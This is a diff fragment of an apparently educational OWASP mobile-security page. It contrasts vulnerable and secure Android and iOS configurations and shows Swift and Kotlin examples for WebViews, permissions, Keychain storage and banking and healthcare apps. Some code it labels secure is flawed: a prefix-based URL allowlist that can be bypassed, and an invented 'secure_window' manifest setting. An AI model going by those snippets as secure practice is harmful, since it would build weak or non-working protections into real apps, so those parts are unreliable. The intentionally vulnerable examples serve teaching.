+<p>        // ✅ GOOD: Disable features</p>
+<p>        webView.allowsBackForwardNavigationGestures = false</p>
+<p>        webView.allowsLinkPreview = false</p>
+        
+<p>        view.addSubview(webView)</p>
+        
+<p>        // Load validated URL</p>
+<p>        if let urlString = validatedURL,</p>
+<p>           let url = URL(string: urlString) {</p>
+<p>            webView.load(URLRequest(url: url))</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    // ✅ GOOD: Validate navigation</p>
+<p>    func webView(_ webView: WKWebView, </p>
+<p>                decidePolicyFor navigationAction: WKNavigationAction,</p>
+<p>                decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {</p>
+        
+<p>        guard let url = navigationAction.request.url else {</p>
+<p>            decisionHandler(.cancel)</p>
+<p>            return</p>
+<p>        }</p>
+        
+<p>        if isURLAllowed(url) {</p>
+<p>            decisionHandler(.allow)</p>
+<p>        } else {</p>
+<p>            decisionHandler(.cancel)</p>
+<p>            showError("Unauthorized URL")</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    // ✅ GOOD: URL whitelist validation</p>
+<p>    private func isURLAllowed(_ url: URL) -> Bool {</p>
+<p>        guard let scheme = url.scheme, scheme == "https" else {</p>
+<p>            return false</p>
+<p>        }</p>
+        
+<p>        let urlString = url.absoluteString</p>
+<p>        return allowedDomains.contains { urlString.hasPrefix($0) }</p>
+<p>    }</p>
+    
+<p>    // ✅ GOOD: Handle SSL errors</p>
+<p>    func webView(_ webView: WKWebView,</p>
+<p>                didReceive challenge: URLAuthenticationChallenge,</p>
+<p>                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {</p>
+        
+<p>        // Don't ignore certificate errors</p>
+<p>        completionHandler(.performDefaultHandling, nil)</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<h3>✅ Example 5: Secure Permission Handling</h3>
+
+<strong>Secure Code (Android - Kotlin)</strong>:
+</code>`<code>kotlin
+<p>class SecurePermissionManager(private val activity: AppCompatActivity) {</p>
+    
+<p>    // ✅ GOOD: Request permission with context</p>
+<p>    fun requestCameraPermission(onGranted: () -> Unit, onDenied: () -> Unit) {</p>
+<p>        when {</p>
+<p>            ContextCompat.checkSelfPermission(</p>
+<p>                activity,</p>
+<p>                Manifest.permission.CAMERA</p>
+<p>            ) == PackageManager.PERMISSION_GRANTED -> {</p>
+<p>                onGranted()</p>
+<p>            }</p>
+            
+<p>            ActivityCompat.shouldShowRequestPermissionRationale(</p>
+<p>                activity,</p>
+<p>                Manifest.permission.CAMERA</p>
+<p>            ) -> {</p>
+<p>                // ✅ GOOD: Show detailed rationale</p>
+<p>                showPermissionRationale(</p>
+<p>                    title = "Camera Permission Required",</p>
+<p>                    message = "This app needs camera access to scan QR codes for authentication. " +</p>
+<p>                             "Your privacy is protected - images are processed locally and never stored.",</p>
+<p>                    onContinue = {</p>
+<p>                        requestPermission(Manifest.permission.CAMERA, onGranted, onDenied)</p>
+<p>                    },</p>
+<p>                    onCancel = onDenied</p>
+<p>                )</p>
+<p>            }</p>
+            
+<p>            else -> {</p>
+<p>                requestPermission(Manifest.permission.CAMERA, onGranted, onDenied)</p>
+<p>            }</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    private fun requestPermission(</p>
+<p>        permission: String,</p>
+<p>        onGranted: () -> Unit,</p>
+<p>        onDenied: () -> Unit</p>
+<p>    ) {</p>
+<p>        val launcher = activity.registerForActivityResult(</p>
+<p>            ActivityResultContracts.RequestPermission()</p>
+<p>        ) { isGranted -></p>
+<p>            if (isGranted) {</p>
+<p>                onGranted()</p>
+<p>            } else {</p>
+<p>                onDenied()</p>
+<p>            }</p>
+<p>        }</p>
+<p>        launcher.launch(permission)</p>
+<p>    }</p>
+    
+<p>    // ✅ GOOD: Guide to settings if permanently denied</p>
+<p>    private fun showPermissionRationale(</p>
+<p>        title: String,</p>
+<p>        message: String,</p>
+<p>        onContinue: () -> Unit,</p>
+<p>        onCancel: () -> Unit</p>
+<p>    ) {</p>
+<p>        MaterialAlertDialogBuilder(activity)</p>
+<p>            .setTitle(title)</p>
+<p>            .setMessage(message)</p>
+<p>            .setPositiveButton("Continue") { _, _ -> onContinue() }</p>
+<p>            .setNegativeButton("Cancel") { _, _ -> onCancel() }</p>
+<p>            .show()</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<h2>Configuration Comparisons</h2>
+
+<h3>Android Manifest: Vulnerable vs Secure</h3>
+
+<p>| Configuration | ❌ Vulnerable | ✅ Secure |</p>
+<p>|--------------|--------------|----------|</p>
+<p>| <strong>debuggable</strong> | </code>true<code> | </code>false<code> |</p>
+<p>| <strong>allowBackup</strong> | </code>true<code> (no rules) | </code>true<code> with exclusion rules |</p>
+<p>| <strong>usesCleartextTraffic</strong> | </code>true<code> | </code>false<code> |</p>
+<p>| <strong>exported</strong> (activities) | </code>true<code> (unnecessary) | </code>false<code> (unless needed) |</p>
+<p>| <strong>permissions</strong> | All requested upfront | Minimal, runtime requests |</p>
+<p>| <strong>networkSecurityConfig</strong> | Not set | Configured with pinning |</p>
+<p>| <strong>WebView debugging</strong> | Enabled | Disabled in production |</p>
+<p>| <strong>dataExtractionRules</strong> | Not set | Configured (Android 12+) |</p>
+
+<h3>iOS Info.plist: Vulnerable vs Secure</h3>
+
+<p>| Configuration | ❌ Vulnerable | ✅ Secure |</p>
+<p>|--------------|--------------|----------|</p>
+<p>| <strong>NSAllowsArbitraryLoads</strong> | </code>true<code> | </code>false<code> |</p>
+<p>| <strong>TLS Version</strong> | TLSv1.0 | TLSv1.3 |</p>
+<p>| <strong>Permission Descriptions</strong> | Vague | Specific and clear |</p>
+<p>| <strong>UIFileSharingEnabled</strong> | </code>true<code> | </code>false<code> |</p>
+<p>| <strong>Data Protection</strong> | Not set | Complete protection |</p>
+<p>| <strong>Certificate Transparency</strong> | Not required | Required |</p>
+
+<h3>Build Configuration: Vulnerable vs Secure</h3>
+
+<p>| Aspect | ❌ Vulnerable | ✅ Secure |</p>
+<p>|--------|--------------|----------|</p>
+<p>| <strong>ProGuard/R8</strong> | Disabled | Enabled with rules |</p>
+<p>| <strong>Debugging</strong> | Enabled | Disabled in release |</p>
+<p>| <strong>Logging</strong> | Verbose | Removed in production |</p>
+<p>| <strong>Code Optimization</strong> | None | Maximum |</p>
+<p>| <strong>Resource Shrinking</strong> | Disabled | Enabled |</p>
+<p>| <strong>Signing</strong> | Debug key | Release key (secure) |</p>
+<p>| <strong>Obfuscation</strong> | None | Aggressive |</p>
+
+<h2>Platform-Specific Examples</h2>
+
+<h3>Android: Content Provider Security</h3>
+
+<strong>❌ Vulnerable</strong>:
+</code>`<code>xml
+<provider
+<p>    android:name=".DataProvider"</p>
+<p>    android:authorities="com.example.provider"</p>
+<p>    android:exported="true"</p>
+<p>    android:grantUriPermissions="true" /></p>
+</code>`<code>
+
+<strong>✅ Secure</strong>:
+</code>`<code>xml
+<provider
+<p>    android:name=".DataProvider"</p>
+<p>    android:authorities="com.example.provider"</p>
+<p>    android:exported="false"</p>
+<p>    android:grantUriPermissions="false"</p>
+<p>    android:readPermission="com.example.permission.READ_DATA"</p>
+<p>    android:writePermission="com.example.permission.WRITE_DATA"></p>
+</provider>
+
+<!-- Define custom permissions -->
+<permission
+<p>    android:name="com.example.permission.READ_DATA"</p>
+<p>    android:protectionLevel="signature" /></p>
+<permission
+<p>    android:name="com.example.permission.WRITE_DATA"</p>
+<p>    android:protectionLevel="signature" /></p>
+</code>`<code>
+
+<h3>iOS: Keychain Data Protection</h3>
+
+<strong>❌ Vulnerable</strong>:
+</code>`<code>swift
+<p>// No data protection</p>
+<p>UserDefaults.standard.set(sensitiveToken, forKey: "token")</p>
+</code>`<code>
+
+<strong>✅ Secure</strong>:
+</code>`<code>swift
+<p>// ✅ GOOD: Use Keychain with appropriate protection</p>
+<p>func storeToken(_ token: String) -> Bool {</p>
+<p>    guard let data = token.data(using: .utf8) else { return false }</p>
+    
+<p>    let query: [String: Any] = [</p>
+<p>        kSecClass as String: kSecClassGenericPassword,</p>
+<p>        kSecAttrAccount as String: "auth_token",</p>
+<p>        kSecValueData as String: data,</p>
+<p>        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly</p>
+<p>    ]</p>
+    
+<p>    SecItemDelete(query as CFDictionary)</p>
+<p>    let status = SecItemAdd(query as CFDictionary, nil)</p>
+<p>    return status == errSecSuccess</p>
+<p>}</p>
+</code>`<code>
+
+<h2>Real-World Scenarios</h2>
+
+<h3>Scenario 1: Banking App Configuration</h3>
+
+<strong>Requirements</strong>:
+<ul>
+<li>Maximum security</li>
+<li>No screenshots allowed</li>
+<li>Certificate pinning</li>
+<li>Biometric authentication</li>
+<li>No backups</li>
+</ul>
+
+<strong>Implementation (Android)</strong>:
+</code>`<code>xml
+<!-- AndroidManifest.xml -->
+<application
+<p>    android:allowBackup="false"</p>
+<p>    android:usesCleartextTraffic="false"</p>
+<p>    android:networkSecurityConfig="@xml/network_security_config"></p>
+    
+    <activity
+<p>        android:name=".BankingActivity"</p>
+<p>        android:exported="false"</p>
+<p>        android:windowSoftInputMode="stateAlwaysHidden"></p>
+        
+        <!-- Prevent screenshots -->
+        <meta-data
+<p>            android:name="android.app.secure_window"</p>
+<p>            android:value="true" /></p>
+    </activity>
+</application>
+</code>`<code>
+
+</code>`<code>java
+<p>@Override</p>
+<p>protected void onCreate(Bundle savedInstanceState) {</p>
+<p>    super.onCreate(savedInstanceState);</p>
+    
+<p>    // Prevent screenshots</p>
+<p>    getWindow().setFlags(</p>
+<p>        WindowManager.LayoutParams.FLAG_SECURE,</p>
+<p>        WindowManager.LayoutParams.FLAG_SECURE</p>
+<p>    );</p>
+    
+<p>    // Require biometric</p>
+<p>    showBiometricPrompt();</p>
+<p>}</p>
+</code>`<code>
+
+<h3>Scenario 2: Healthcare App (HIPAA Compliance)</h3>
+
+<strong>Requirements</strong>:
+<ul>
+<li>Encrypted storage</li>
+<li>Audit logging</li>
+<li>Data protection</li>
+<li>Minimal permissions</li>
+</ul>
+
+<strong>Implementation (iOS)</strong>:
+</code>`<code>swift
+<p>// ✅ GOOD: HIPAA-compliant storage</p>
+<p>class SecureHealthDataManager {</p>
+<p>    func storePatientData(_ data: PatientData) throws {</p>
+<p>        let jsonData = try JSONEncoder().encode(data)</p>
+        
+<p>        // Store with complete protection</p>
+<p>        let fileURL = getSecureURL()</p>
+<p>        try jsonData.write(to: fileURL, options: .completeFileProtection)</p>
+        
+<p>        // Exclude from backup</p>
+<p>        var resourceValues = URLResourceValues()</p>
+<p>        resourceValues.isExcludedFromBackup = true</p>
+<p>        try fileURL.setResourceValues(resourceValues)</p>
+        
+<p>        // Audit log</p>
+<p>        auditLog("Patient data stored securely")</p>
+<p>    }</p>
+<p>}</p>
+</code>``
+
+<p>---</p>
+
+<strong>Key Takeaway</strong>: Security configurations must be environment-specific and regularly audited. What's acceptable in development is often dangerous in production.
+
+<em>Part of OWASP Mobile Top 10 - Educational Repository</em>
+
         </div>
     </div>
 </body>
